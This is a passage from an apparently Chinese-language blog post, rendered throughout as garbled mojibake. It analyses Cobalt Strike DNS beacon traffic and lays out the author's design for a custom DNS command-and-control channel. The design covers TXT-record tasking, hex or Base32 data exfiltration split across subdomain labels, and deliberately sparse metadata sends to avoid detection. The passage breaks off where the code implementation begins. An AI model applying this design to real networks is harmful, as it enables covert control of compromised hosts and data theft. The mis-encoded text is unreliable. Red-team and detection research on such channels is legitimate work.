<p>é¦–å…ˆæ˜¯ä¸Šçº¿çš„æµé‡ï¼Œå¯ä»¥çœ‹åˆ°NSè®°å½• <code>1.abcplus.xyz</code> ä¸agentId <code>303c2df6</code> ç»„æˆäº†å¾…æŸ¥è¯¢çš„å­åŸŸ <code>303c2df6.1.abcplus.xyz</code>ï¼Œåç»­çš„æ¯ä¸€ä¸ªDNSæŸ¥è¯¢éƒ½è¦å¸¦ä¸ŠagentIdã€‚æ¯è¿‡å®Œä¸€ä¸ª <code>sleep</code> æ—¶é—´éƒ½ä¼šå‘serverå‘é€ä¸€æ¬¡è¿™æ ·çš„æŸ¥è¯¢ï¼Œç›®çš„æ˜¯è¯æ˜beaconè¿˜æ´»ç€ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-07-24-5cb8ebe35c9a6c51f4363c0a783b692e-20250905140723-485595.png"></p>
<p>ä¸‹å›¾æ˜¯4.5 Beaconæºç çš„ <code>genagentid</code> å‡½æ•°ã€‚ä¸åŒç‰ˆæœ¬çš„cs <code>genagentid</code> å‡½æ•°çš„ç®—æ³•å¯èƒ½ä¸ä¸€æ ·ï¼</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-53-31-7c3ab11d5645e21f43e7e8bd5f5fd347-20250905145330-9d2abe.png"></p>
<p>ä¸‹å›¾æ˜¯4.5 å®¢æˆ·ç«¯ç”¨äºæ ¡éªŒbeaconidçš„ <code>isDNSBeacon</code> å‡½æ•°</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-58-58-ae08a3a9966da4f803e29e898aa344a0-20250905145858-4dfbfb.png"></p>
<p>ä½¿ç”¨Aè®°å½•DNSæŸ¥è¯¢å»æ‹‰å–ä»»åŠ¡æ—¶ï¼Œserverä¼šè¿”å›ä¿¡å·ç”¨äºæ§åˆ¶beaconçš„è¡Œä¸ºï¼Œå…·ä½“æ¥è¯´å°±æ˜¯serverè¿”å›çš„ipè½¬æ¢æˆ32ä½çš„æ•´æ•°ï¼Œç„¶åä¸dnsidleå¼‚æˆ–ï¼Œå¾—åˆ°çœŸæ­£çš„æ§åˆ¶ä¿¡å·ã€‚</p>
<ul>
<li>å¦‚æœæ§åˆ¶ä¿¡å·ä¸º0ï¼ˆipä¸º0.0.0.0ï¼‰ï¼Œå°±æ„å‘³ç€å›¢é˜ŸæœåŠ¡å™¨çš„ä»»åŠ¡é˜Ÿåˆ—ä¸­æ²¡æœ‰éœ€è¦è¯¥beaconæ‰§è¡Œçš„ä»»åŠ¡ï¼›</li>
<li>å¦‚æœæ§åˆ¶ä¿¡å·ä¸º<code>240~245</code>ï¼ˆipä¸º<code>0.0.0.240~245</code>ï¼‰ï¼Œå°±è¦æ ¹æ®æ§åˆ¶ä¿¡å·å»æ¥æ£€æŸ¥éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚å°±æ¯”å¦‚è¯´æ§åˆ¶ä¿¡å·ä¸º242ï¼Œå°±è¡¨æ˜è¦ç”¨TXTæŸ¥è¯¢å»è·å–ä»»åŠ¡æ•°æ®å’Œå¤„ç†ä»»åŠ¡æ•°æ®ã€‚</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/15-09-20-26f0387479b6045415f2380b3d08b016-20250905150920-7dc55e.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/24/20-59-19-9c7f5019da5136a535bb1d7234688a42-20250924205919-679701.png"></p>
<p>æ‰§è¡Œ <code>checkin</code> å‘½ä»¤ï¼Œä»¥wwwä½œä¸ºå‰ç¼€çš„å­åŸŸåœ¨åŸŸåä¸­æºå¸¦äº†ä¸»æœºä¿¡æ¯ï¼ˆmetadataï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„å¿ƒè·³åŒ…ã€‚è§ä¸‹å›¾çœ‹æµé‡ã€‚</p>
<ul>
<li>ç¬¬ä¸€ä¸ªwwwå‰ç¼€çš„åŸŸåè¡¨æ˜äº†æ¥ä¸‹æ¥çš„serverè¦æ¥æ”¶æ¥è‡ªbeaconçš„å›ä¼ æ•°æ®é•¿åº¦ï¼Œå…¶ä¸­ <code>180</code> çš„è§£é‡Šï¼š1è¡¨ç¤ºç”¨1ä¸ªæ ‡ç­¾å»ä¼ è¾“è¿™ä¸ªæ•°æ®ï¼Œ<code>80</code> è¡¨ç¤º16è¿›åˆ¶è¡¨ç¤ºçš„æ•°æ®é•¿åº¦ï¼Œ <code>80</code> åªæœ‰ä¸¤ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åªç”¨1ä¸ªæ ‡ç­¾å°±èƒ½ä¼ è¾“</li>
<li>åé¢ä¸¤ä¸ªå°±æ˜¯è¦å›ä¼ çš„æ•°æ®äº†</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-38-13-f6a6476a04af82c365cfe741abc79e6d-20250905133813-b54407.png"></p>
<p>æ¥çœ‹çœ‹beaconæºç æ˜¯æ€ä¹ˆå®šä¹‰å›ä¼ ç»“æœçš„æ¨¡æ¿ï¼Œä¸»è¦æ˜¯è¿™ä¸ªè¯­å¥ <code>_snprintf(c2domain, 1024, &quot;%s1%x.%x%x.%s&quot;, type, length, reqno, nonce, domain);</code>ï¼Œå³ <code>&lt;type&gt;1&lt;len&gt;.&lt;reqno&gt;.&lt;nonce&gt;.&lt;domain&gt;</code></p>
<ul>
<li><code>&lt;type&gt;</code> æ˜¯å‰ç¼€ï¼ˆå¦‚apiã€wwwã€postï¼‰ï¼Œä»£ç ä¸­æ˜¯æœ‰å®šä¹‰çš„</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/17-11-10-d8edb3baed4d95240bf73074a31c2358-20250905171109-c818bb.png"></p>
<ul>
<li>åªç”¨1ä¸ªæ ‡ç­¾ï¼Œå°±èƒ½ä¼ è¾“â€œæ€»å­—èŠ‚æ•°â€ã€‚</li>
<li><code>&lt;len&gt;</code> æ˜¯<strong>æ€»å­—èŠ‚æ•°</strong></li>
<li><code>reqno</code>ï¼šåºå·ï¼Œé€åŒ…é€’å¢ï¼Œ<strong>é˜²æ­¢DNSç¼“å­˜å‘½ä¸­</strong>ã€‚</li>
<li><code>nonce</code>ï¼šå®ƒæ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨æ¥å”¯ä¸€æ ‡è¯†è¯·æ±‚ã€‚</li>
<li><code>domain</code>ï¼šNSè®°å½•ã€‚</li>
</ul>
<p>âš æ³¨æ„ï¼šå¯ä»¥çœ‹åˆ°ä¸‹å›¾ä¸­å‰ç¼€åé¢æ²¡æœ‰è·Ÿç€ <code>.</code>ï¼Œè€Œwiresharkåé¢æ˜¯è·Ÿç€çš„ï¼Œå³ <code>www.</code>ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œåœ¨åé¢çš„ <code>4.4 ä»£ç å®ç°</code> ä¸­æˆ‘æ˜¯ä»¥å¸¦ <code>.</code>  ä¸ºæ ‡å‡†çš„åšæ³•ã€‚ä¸‹å›¾æ˜¯é•¿åº¦æ˜¯é‹å¸¦é•¿åº¦çš„åŸŸå</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/15-31-55-4a197d71f16c5ede1e227f8fd620dccf-20250905153155-2a152a.png"></p>
<p>å¯¹äºé‹å¸¦æ•°æ®çš„åŸŸåå¦‚ä½•æ„é€ ï¼Œæˆ‘å…ˆæŒ‰ä¸‹ä¸è¡¨ï¼Œç­‰åˆ°äº† <code>4.4 ä»£ç å®ç°</code> æˆ‘åœ¨è¯¦ç»†è¯´æ˜ã€‚</p>
<p>ä»¥apiä½œä¸ºå‰ç¼€çš„åŸŸååº”è¯¥æ˜¯ä¸ä»»åŠ¡ç›¸å…³çš„æ“ä½œå§ï¼Œbeaconé¦–å…ˆå‘èµ·Aè®°å½•æŸ¥è¯¢ï¼Œserverç”¨ <code>0.0.0.48</code> å°†ä¿¡æ¯è¿”å›ç»™beaconï¼Œå…¶ä¸­ipåœ°å€æœ€åçš„48ä»£è¡¨æŸç§å‘½ä»¤å«ä¹‰ï¼Œè¿™ä¸ªæˆ‘ä¸æ˜¯å¾ˆäº†è§£ï¼Œå› ä¸ºä¸æ˜¯é‡å†™ä¸€ä¸ªCSçš„Beaconï¼Œæ‰€ä»¥å¹¶ä¸å…³å¿ƒå®ƒä»£è¡¨ä»€ä¹ˆå«ä¹‰ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-39-28-873b5e8d57b6f06da1a58d048ad0d762-20250905133927-f70932.png"></p>
<p>æœ€åçš„TXTè®°å½•ç±»å‹æŸ¥è¯¢ <code>api.*</code> å­åŸŸå°±æ˜¯è·å–ä»»åŠ¡æ•°æ®ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-30-35-f2227a7ae36125c28dfe2fe25609ce5f-20250905163035-4a119e.png"></p>
<p>æ‰§è¡Œ <code>ls</code> å‘½ä»¤ï¼Œbeaconæ‰§è¡Œå®Œå‘½ä»¤åï¼Œä¼šä»¥postä½œä¸ºå‰ç¼€çš„åŸŸåå›ä¼ çš„æ‰§è¡Œç»“æœï¼Œç»“æœå¦‚ä½•æ„é€ åœ¨ä¸‹æ–‡çš„ <code>4.4 ä»£ç å®ç°</code> è¯¦ç»†è¯´æ˜ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-36-39-92b2d1759e9b703a59224f3cffb93f84-20250905163638-8fc8b9.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-37-07-da038c838889589aec5595abb9ad0059-20250905163707-627cc3.png"></p>
<h3 id="ï¼ˆå››ï¼‰éœ€è¦æ³¨æ„çš„ç‚¹"><a href="#ï¼ˆå››ï¼‰éœ€è¦æ³¨æ„çš„ç‚¹" class="headerlink" title="ï¼ˆå››ï¼‰éœ€è¦æ³¨æ„çš„ç‚¹"></a>ï¼ˆå››ï¼‰éœ€è¦æ³¨æ„çš„ç‚¹</h3><p><strong>â‘ æ”¾è¡Œudp 53çš„å…¥ç«¯å£</strong></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-42-21-ec230678cffdf4893d56336d825b4d63-20250904214221-ac514a.png"></p>
<p><strong>â‘¡53ç«¯å£è¢«å ç”¨</strong></p>
<p><strong>Ubuntu 16.10ï¼ˆ2016 å¹´ 10 æœˆï¼‰</strong> å¼€å§‹ï¼Œå®˜æ–¹é»˜è®¤æŠŠæœ¬åœ°DNSè§£æäº¤ç»™ <strong>systemd-resolved</strong> æœåŠ¡ï¼Œæˆ‘ä»¬éœ€è¦å…³é—­å®ƒï¼Œè¯·ä»¥rootæƒé™è¿è¡Œä¸‹é¢å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å®Œåè®°å¾—å¼€å¯ï¼Œä¸ç„¶vpsä¸èƒ½æ­£å¸¸çš„è®¿é—®å¤–éƒ¨æœåŠ¡ï¼ˆæ¯”å¦‚è¯´ä¸‹è½½è½¯ä»¶åŒ…ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start systemd-resolved</span><br></pre></td></tr></table></figure>

<p><strong>â‘¢è®¾ç½®DNSæœåŠ¡å™¨ipåœ°å€</strong></p>
<p>å¦‚æœä½ æ˜¯åœ¨è™šæ‹Ÿæœºæµ‹è¯•ï¼Œè¯·è®¾ç½®DNSæœåŠ¡å™¨ä¸º<code>8.8.8.8</code>æˆ–è€… <code>223.5.5.5</code>ï¼Œä¸ç„¶å¯èƒ½ä¼šæ²¡åŠæ³•ä¸Šçº¿åˆ°CSçš„æœåŠ¡å™¨ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/11-36-45-ba14d3d2c8e6c6edb83f84a3bbfa6241-20250905113644-2b853b.png"></p>
<h2 id="4-3-æ€è·¯æ„å»º"><a href="#4-3-æ€è·¯æ„å»º" class="headerlink" title="4.3 æ€è·¯æ„å»º"></a>4.3 æ€è·¯æ„å»º</h2><p>çœ‹å®Œä¸Šè¿°çš„æµé‡åˆ†æï¼Œæˆ‘ç›¸ä¿¡å„ä½å¸ˆå‚…è‚¯å®šæ˜¯æœ‰è‡ªå·±çš„æ€è·¯äº†ï¼Œé‚£æˆ‘å°±çŒ®ä¸‘è¯´ä¸€ä¸‹è‡ªå·±çš„æ€è·¯æ„å»ºã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨DNSéš§é“åœºæ™¯ä¸­ï¼ŒDNSæŸ¥è¯¢éƒ½æ˜¯ç”±<strong>beacon-&gt;server</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„<strong>åå‘è¿æ¥</strong>ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦Serveréœ€å…ˆç›‘å¬53ç«¯å£å¹¶æ‰˜ç®¡ä¸€æ¡NSè®°å½•ï¼Œä¾‹å¦‚æŠŠå­åŸŸ <code>poll.example.com</code> çš„æƒå¨NSæŒ‡å‘è‡ªå·±ï¼ˆ<code>ns1.example.com</code>ï¼‰ã€‚Beaconæ¯æ¬¡å‘ <code>poll.example.com</code> å‘èµ·TXTæŸ¥è¯¢æ—¶ï¼Œé€’å½’æœåŠ¡å™¨ä¼šå¾ªNSè®°å½•æŠŠè¯·æ±‚<strong>è½¬å‘åˆ°Serverçš„å…¬ç½‘ IP</strong>ï¼Œç„¶åç”±Serveræ¥è§£æå­åŸŸæŸ¥è¯¢ï¼Œå¹¶æ ¹æ®å­åŸŸåæ ‡ç­¾çš„ç»„åˆæ¥å†³å®šé‡‡å–ä»»åŠ¡ä¸‹å‘è¿˜æ˜¯ç»“æœå¤„ç†çš„æ“ä½œã€‚</p>
<p>Beaconæ‰§è¡Œå®Œä»»åŠ¡åéœ€è¦å°†ç»“æœå›æ˜¾åˆ°æœåŠ¡å™¨ï¼Œè¿™åˆå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼šè®©Serverå‘Beaconå‘èµ·DNSæŸ¥è¯¢ä¸å¤ªç°å®ï¼ˆä¹Ÿä¸æ˜¯ä¸å¯èƒ½ï¼‰ï¼Œå¹¶ä¸”beacon-&gt;serveræ–¹å‘çš„æŸ¥è¯¢åªèƒ½è¯·æ±‚æ•°æ®ï¼Œå¹¶ä¸èƒ½å°†æ•°æ®å›ä¼ ç»™æœåŠ¡å™¨ã€‚</p>
<p>å¥½åœ¨è¿™ä¸ªå›°éš¾å¹¶éä¸èƒ½è§£å†³ï¼Œ<strong>æŸ¥è¯¢å•æ¡DNSåŸŸåæœ€é•¿253å­—ç¬¦ï¼Œå•ä¸ªæ ‡ç­¾æœ€é•¿ä¸º63ä¸ªå­—ç¬¦</strong>ï¼Œå‡å»å›ºå®šçš„åŸŸåéƒ¨åˆ†ï¼ˆå¦‚ <code>.c2.example.com</code>ï¼‰ï¼Œå¯ç”¨äºæºå¸¦æ•°æ®çš„ç©ºé—´éå¸¸æœ‰é™ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†æ‰§è¡Œçš„ç»“æœæ‹¼æ¥åœ¨åŸŸåä¸Šï¼Œå¦‚æœè¦å›ä¼ çš„ç»“æœå¤ªé•¿ï¼Œå°±å¯ä»¥åˆ†ç‰‡å›ä¼ ï¼Œç„¶åserveræ ¹æ®æŸç§æ–¹å¼æ‹¼æ¥æˆæœ€ç»ˆçš„ç»“æœã€‚metadataçš„å›ä¼ ä¸ä¸Šè¿°åŒç†ã€‚</p>
<p>å…¶å®serverä¼ è¾“ç»™beaconçš„ä»»åŠ¡æ•°æ®ä¹Ÿæœ‰é•¿åº¦é™åˆ¶ï¼Œå•æ¡txtè®°å½•ä¸º255å­—èŠ‚ï¼Œä¸€ä¸ªDNSå“åº”æŠ¥æ–‡è¿è¡Œå­˜æ”¾å¤šä¸ªtxtè®°å½•ï¼Œæ‰€ä»¥æœ€ç»ˆèƒ½è¿”å›ç»™è¿”å›beaconçš„ä»»åŠ¡æ•°æ®çš„æœ€å¤§é•¿åº¦å—UDPã€DNSåè®®é™åˆ¶ä»¥åŠEDNS0çš„å½±å“ï¼Œæœ€ç»ˆåœ¨æœ¬æ–‡ä¸­æˆ‘é™åˆ¶æœ€å¤§ä¸º4096å­—èŠ‚ã€‚</p>
<p>æˆ‘å°±åœ¨æƒ³ï¼Œé™¤äº†ä¸Šé¢åœ¨æŸ¥è¯¢çš„åŸŸåä¸­æºå¸¦æ•°æ®ä¹‹å¤–ï¼Œè¿˜è¦ä»€ä¹ˆæ–¹å¼èƒ½å›ä¼ æ•°æ®ï¼Œæˆ‘ä¹ŸæŸ¥è¿‡ç½‘ä¸Šèµ„æ–™éƒ½æ²¡æœ‰æ»¡æ„çš„ç­”æ¡ˆï¼Œæœ€åä¹Ÿé—®è¿‡aiï¼Œè®©æˆ‘æœ€éš¾å´©çš„æ˜¯å®ƒç»™æˆ‘çæ‰¯ã€‚å¯èƒ½æˆ‘æè¿°çš„æœ‰äº›ä¸å‡†ç¡®ï¼Œæ›´å‡†ç¡®çš„æè¿°åº”è¯¥æ˜¯ï¼šâ€œè¿™é‡Œbeaconå›ä¼ æ•°æ®ç»™serveråªèƒ½å°†æ•°æ®ç¼–ç åœ¨åŸŸåä¸­â€</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/17-21-25-04360e9c70e457d13a9525d6d5fef73f--I9%60ZJDIO-C565NG%600K2-8E-c187dd.png" alt="@I9&#96;ZJDIO@C565NG&#96;0K2@8E.png"></p>
<p>åœ¨beaconæºç ä¸­åªæœ‰dns_get_txtã€dns_get6å’Œdns_getå’Œdns_putï¼Œå“ªé‡Œæ¥çš„dns_put_txtå’Œdns_put6ï¼ˆåæ­£åœ¨CS4.5çš„æºç ä¸­æ˜¯æ²¡çœ‹åˆ°ï¼‰ï¼Œè€Œä¸”æˆ‘ä¹Ÿåšäº†å®éªŒï¼ˆç”¨çš„æ˜¯CS 4.9ï¼‰ï¼Œä¸‰ç§æ¨¡å¼éƒ½è¯•äº†ä¸€éï¼Œéƒ½æ˜¯åœ¨åŸŸåä¸­å›ä¼ æ•°æ®ã€‚</p>
<p>ä¸ºäº†åŒºåˆ†<strong>ä»»åŠ¡è·å–</strong>å’Œ<strong>ç»“æœå›æ˜¾ï¼ˆåŒ…å«metadataï¼‰</strong> çš„DNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥è§„å®š<strong>ä»»åŠ¡è·å–</strong>ä½¿ç”¨ <code>TXT</code> æŸ¥è¯¢ï¼›<strong>ç»“æœå›æ˜¾</strong>ä½¿ç”¨ <code>A</code> æŸ¥è¯¢ï¼Œæ›´è¿›ä¸€æ­¥åŒºåˆ†å¯ä»¥åœ¨æŸ¥è¯¢çš„åŸŸåä¸­ä½¿ç”¨å‰ç¼€ï¼Œæ¯”å¦‚è¯´ <code>www.</code> è¡¨ç¤ºå›ä¼  <code>metadata</code>ï¼›<code>api.</code> è¡¨ç¤ºä»»åŠ¡è·å–ï¼›<code>post.</code> è¡¨ç¤ºç»“æœå›æ˜¾ã€‚</p>
<p>å€¼å¾—è¯´æ˜çš„æ˜¯ï¼ŒDNS æŸ¥è¯¢åŸŸåä¸­<strong>å…è®¸å‡ºç°çš„å­—ç¬¦</strong>ä»…æœ‰ï¼š<br>â€¢ æ•°å­— <code>0-9</code><br>â€¢ è‹±æ–‡å¤§å°å†™å­—æ¯ <code>a-zA-Z</code><br>â€¢ è¿æ¥ç¬¦ <code>-</code><br>â€¢ ç‚¹å· <code>.</code>ï¼ˆä»…ä½œæ ‡ç­¾åˆ†éš”ç¬¦ï¼‰</p>
<p>å› æ­¤ï¼Œä»»ä½•å›ä¼ æ•°æ®åœ¨<strong>åµŒå…¥å­åŸŸä¹‹å‰å¿…é¡»å…ˆåšç¼–ç </strong>ï¼ŒæŠŠ<strong>ä¸å¯è§å­—ç¬¦ã€å¤§å†™å­—æ¯ã€ç¬¦å·ã€äºŒè¿›åˆ¶æ•°æ®</strong>ç»Ÿä¸€è½¬æ¢ä¸º <strong>å°å†™å­—æ¯+æ•°å­—</strong>çš„å®‰å…¨å½¢å¼ã€‚ç¤ºä¾‹ï¼š<code>asd.1.g34</code> æ˜¯åˆæ³•åŸŸåã€‚æˆ‘ä»¬çœ‹çœ‹å‰è¾ˆä»¬ç”¨é‚£äº›æ–¹å¼ç¼–ç å§ï¼Œåœ¨ <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/dns.go">sliver</a> çš„DNS C2ç”¨åˆ°äº†Base32å’ŒBase58ä¸¤ç§ç¼–ç æ–¹å¼ï¼Œè€ŒCS Beaconåªç”¨äº†Hexæ ¼å¼çš„ç¼–ç æ–¹å¼ã€‚ä¸åŒç¼–ç å®ƒå½±å“çš„æ˜¯ä¼ è¾“æ•ˆç‡ä»¥åŠéšè”½æ€§ç­‰æ–¹é¢ï¼Œå°±æ¯”å¦‚è¯´Base32æ— å¡«å……æ–¹æ¡ˆï¼Œä¸€ä¸ªå­—ç¬¦å¯¹åº”5ä½æ•°æ®ï¼Œè€ŒHEXç¼–ç æ˜¯ä¸€ä¸ªå­—ç¬¦å¯¹åº”4ä½æ•°æ®ï¼Œå¯¹åº”éšè”½æ€§æ¥è¯´Base32å’ŒHEXéƒ½æ˜¯æ•°å­—å’Œè‹±æ–‡å­—æ¯ï¼Œé™¤äº†å›ä¼ æ•°æ®æ—¶åŸŸåè¿‡é•¿ï¼ˆæœ€æ˜æ˜¾çš„ç‰¹å¾ï¼‰ï¼Œéšè”½æ€§éƒ½å·®ä¸å¤šã€‚</p>
<p>å¥½äº†ï¼Œè¯´äº†è¿™ä¹ˆå¤šæ˜¯æ—¶å€™æ€»ç»“ä¸Šé¢çš„æ€è·¯äº†ï¼š</p>
<ol>
<li><strong>æ ¸å¿ƒæ¨¡å¼</strong>ï¼šDNS Beaconé‡‡ç”¨åå‘è¿æ¥ï¼Œç”±Beaconä¸»åŠ¨å‘æœåŠ¡å™¨å‘èµ·DNSæŸ¥è¯¢ã€‚</li>
<li><strong>ä»»åŠ¡è·å–</strong>ï¼šBeaconé€šè¿‡æŸ¥è¯¢<code>TXT</code>è®°å½•æ¥ä»æœåŠ¡å™¨æ¥æ”¶ä»»åŠ¡æŒ‡ä»¤ã€‚</li>
<li><strong>ç»“æœå›ä¼ </strong>ï¼šBeaconé€šè¿‡å‘èµ· <code>A</code> æŸ¥è¯¢ï¼Œå¹¶å°†ç¼–ç åçš„æ•°æ®æ‹¼æ¥åœ¨åŸŸåä¸­æ¥å›ä¼ ç»“æœã€‚</li>
<li><strong>æ•°æ®åˆ†ç‰‡</strong>ï¼šå› åŸŸåé•¿åº¦é™åˆ¶ï¼Œè¾ƒé•¿æ•°æ®éœ€è¢«åˆ†å‰²æˆå¤šä¸ªç‰‡æ®µä¼ è¾“ï¼Œå†ç”±æœåŠ¡å™¨é‡ç»„ï¼Œéœ€è¦åœ¨æ·»åŠ åºå·ï¼Œæ–¹ä¾¿serveræ‹¼æ¥ã€‚é™¤äº†å›ä¼ æ•°æ®å› é•¿åº¦é™åˆ¶è€Œéœ€è¦åˆ†ç‰‡ï¼ŒServerä¼ ç»™beaconçš„ä»»åŠ¡æ•°æ®ä¹Ÿè¦åˆ†ç‰‡ï¼Œå› ä¸ºå•æ¡txtè®°å½•æœ€å¤§ä¸º255å­—èŠ‚ã€‚å¯¹äºå¤§æ–‡ä»¶ä¼ è¾“è¿˜è¦å®ç°UDPåˆ†ç‰‡ã€‚</li>
<li><strong>ç¼–ç å¿…è¦æ€§</strong>ï¼šä¸ºå…¼å®¹åŸŸåæ ¼å¼ï¼Œæ‰€æœ‰äºŒè¿›åˆ¶æˆ–ç‰¹æ®Šå­—ç¬¦æ•°æ®åœ¨åµŒå…¥åŸŸåå‰å¿…é¡»è¿›è¡Œç¼–ç ï¼Œè½¬æ¢ä¸ºä»…åŒ…å«æ•°å­—ã€å­—æ¯å’Œè¿å­—ç¬¦çš„å®‰å…¨æ ¼å¼ã€‚</li>
<li><strong>ç¼–ç é€‰æ‹©</strong>ï¼šåŸŸåæ•°æ®å¸¸ç”¨Base32&#x2F;Base58å’ŒHexç¼–ç ï¼›TXTè®°å½•ä¸­çš„æ•°æ®åˆ™ä½¿ç”¨æ•ˆç‡æ›´é«˜çš„Base64ç¼–ç ã€‚</li>
</ol>
<p>åºŸè¯å°‘è¯´ï¼Œç›´æ¥å¼€å§‹å†™ä»£ç ã€‚</p>
<h2 id="4-4-ä»£ç å®ç°"><a href="#4-4-ä»£ç å®ç°" class="headerlink" title="4.4 ä»£ç å®ç°"></a>4.4 ä»£ç å®ç°</h2><p>ä¸‹é¢æ‰€å±•ç¤ºçš„ä»£ç ä¸åŒ…å«DNSæœåŠ¡å™¨å°†NSè®°å½•å§”æ‰˜ç»™ç›‘å¬å™¨ï¼Œè€Œæ˜¯Beaconç›´æ¥è¿æ¥ç›‘å¬å™¨ï¼Œå‘é€DNSæŸ¥è¯¢ï¼Œè¿™ä¸å®æˆ˜æœ‰äº›åŒºåˆ«ï¼Œä½†æ˜¯ä¸»è¦çš„é€»è¾‘æ¡†æ¶æ˜¯å®Œæ•´çš„ã€‚</p>
<p>âš <strong>æ³¨æ„</strong>ï¼šæˆ‘å¹¶éå®Œå…¨æŒ‰ç…§CSçš„åšæ³•ç¼–å†™ä»£ç ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯ <strong>â€œæˆ‘æƒ³è¿™ä¹ˆå†™å°±è¿™ä¹ˆå†™äº†â€</strong> ï¼Œå¦‚æœä½ æ˜¯æƒ³é‡æ„Beaconï¼Œé‚£ä¹ˆä»£ç å¯èƒ½ä¸ä¼šå¯¹ä½ æœ‰ä»»ä½•å¸®åŠ©ã€‚</p>
<h3 id="ï¼ˆä¸€ï¼‰å‘é€å¿ƒè·³åŒ…-Beacon"><a href="#ï¼ˆä¸€ï¼‰å‘é€å¿ƒè·³åŒ…-Beacon" class="headerlink" title="ï¼ˆä¸€ï¼‰å‘é€å¿ƒè·³åŒ…-Beacon"></a>ï¼ˆä¸€ï¼‰å‘é€å¿ƒè·³åŒ…-Beacon</h3><p><strong>ï¼ˆ1ï¼‰metadataåŒ…åªå‘é€ä¸€æ¬¡</strong></p>
<p>CSçš„åšæ³•æ˜¯é€šè¿‡checkinå‘½ä»¤è®©beaconå›ä¼ metadataï¼Œä½¿ç”¨checkinå‘½ä»¤éœ€è¦serverè¿”å›ipç»™Beaconï¼ŒBeaconè§£æipå¾—åˆ°æ§åˆ¶ä¿¡å·ï¼Œç„¶åä½¿ç”¨æœ€åä¸€ä¸ªå­—èŠ‚æ¥è¡¨æ˜ç”¨ä»€ä¹ˆç±»å‹çš„è®°å½•å»è·å–å‘½ä»¤ã€‚</p>
<p>æˆ‘çš„åšæ³•æ˜¯ï¼šé‰´äºmetadataç¨³å®šä¸å˜ï¼Œæˆ‘ä»…åœ¨ä¸Šçº¿æ—¶ä¸»åŠ¨å›ä¼ ä¸€æ¬¡ï¼Œå…¶ä½™æƒ…å†µéƒ½ä¸ä¼ è¾“ï¼Œé¿å…æ¯æ¬¡æ‹‰å–ä»»åŠ¡éƒ½å‘é€metadataå½±å“é€Ÿç‡å’Œå¢å¤§è¢«æ£€æµ‹çš„é£é™©ï¼ˆé¢‘ç¹å‘é€è¶…é•¿åŸŸåï¼‰ï¼Œä¹Ÿçœå»é¢å¤–çš„æ§åˆ¶ä¿¡å·äº¤äº’ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/18-28-22-d1932865dc18e2e3f7b4b5040e477b5b-20250922182822-824f81.png"></p>
<p>æ—¢ç„¶metadataåŒ…åªå‘é€ä¸€æ¬¡ï¼Œè¦é¿å…Beaconè¿è¡Œäº†ï¼Œè€ŒServerç›‘å¬å™¨æœªå¯åŠ¨å¯¼è‡´metadataåŒ…ä¸¢å¤±ï¼Œéœ€è¦æœ‰é‡ä¼ æœºåˆ¶ï¼Œä¿è¯metadataåŒ…ä¸€å®šé€è¾¾åˆ°serveråæ‰è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚è¿™ä¸ªé‡ä¼ æœºåˆ¶ä¸ä»…æ˜¯ç”¨åœ¨å‘é€metadataåŒ…ï¼Œè¿˜å¯ä»¥ç”¨åœ¨å›ä¼ æ•°æ®åŒ…æˆ–è€…å…¶ä»–Aè®°å½•æŸ¥è¯¢ã€‚æ ¹æ®ä¸Šé¢çš„æ€è·¯å¾ˆå®¹æ˜“å¾—åˆ°ä¸‹é¢çš„ä»£ç ï¼Œ<code>channelLookupRetry_A</code> å‘é€Aè®°å½•å¤±è´¥å°±é‡ä¼ ï¼Œè€Œ <code>sendA</code> æ˜¯å…·ä½“å®ç°DNS Aè®°å½•æŸ¥è¯¢çš„ã€‚</p>
